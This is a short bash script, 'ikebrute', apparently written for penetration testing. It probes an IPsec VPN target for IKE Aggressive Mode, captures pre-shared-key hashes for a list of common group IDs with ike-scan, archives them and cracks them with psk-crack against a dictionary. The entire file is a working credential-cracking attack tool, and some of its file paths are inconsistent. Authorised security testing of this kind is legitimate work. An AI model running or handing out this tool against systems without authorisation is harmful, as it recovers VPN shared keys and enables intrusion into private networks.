#!/bin/bash

# ikebrute v1.1
# Simply runs through a wordlist of default/common group IDs and parses each hash to a separate file.
# Then it runs through the hashes with psk-crack using a wordlist mangled with john and hobo64.rule 
#
# Kevin Gilstrap, Lead Sr. Penetration Tester
# Sungard Availability Services, Information Security Consulting
#
# Checks for root
if [ "$(whoami)" != "root" ]; then
	clear	
	echo "Please run as root"
exit 0
fi
# Checks for Usage
if [ -z "$1" ]; then
	clear
        echo "echo [*]  Usage:  sh ikebrute.sh [TARGET IP] [/path/to/wordlist]"
exit 0
fi
# Checks to verify aggressive mode is enabled
echo "[*]  Checking if Aggressive mode is enabled"
aggressive=$(ike-scan -M $1 --id=test -P -A | grep "Aggressive")
if [ -z "$aggressive" ]; then
	clear
	echo "Aggressive Mode is not enabled"
	exit 0
fi
# Captures hashes
clear
echo "[*]  Capturing hashes"
for i in $(cat /opt/ikebrute/wordlist.dic); do
	echo Capturing $i
	ike-scan -M $1 --id=$i -P -A | tail -n 2 | grep -v "Ending" | tee $i.hash
done
clear
echo "[*]  Compressing the hashes to an archive"
basefile=$(echo $1 | tr -d ".")
tar -czvf $basefile.tar.gz /opt/ikebrute/*.hash
#Cracking hashes
clear
echo "[*]  Cracking hashes"
for x in $(ls | grep hash); do
	echo Testing: $x
	#john --rules=/opt/ikebrute/besthobo64.rule --wordlist=/opt/ikebrute/psk-crack-dictionary --stdout | psk-crack -d - $x
	if [ -z "$2" ]; then
		psk-crack $x --dictionary=/opt/ikebrute/psk-crack-dictionary | tee -a pskcrack.out
	else
		psk-crack $x --dictionary=$2 | tee -a pskcrack.out
	fi
done
# Parsing results
cat pskcrack.out | grep -v "Running" | grep -v "Ending" | grep -v "Starting" | tee -a ikebrute-results.txt
# Cleanup files
echo "[*]  Performing cleanup"
rm -rf /opt/ikebrute/ikebrute-results.txt
rm -rf /opt/ikebrute/*.hash
rm -rf /opt/ikebrute/pskcrack.out
#Complete
echo "[*]  Complete"
exit 0
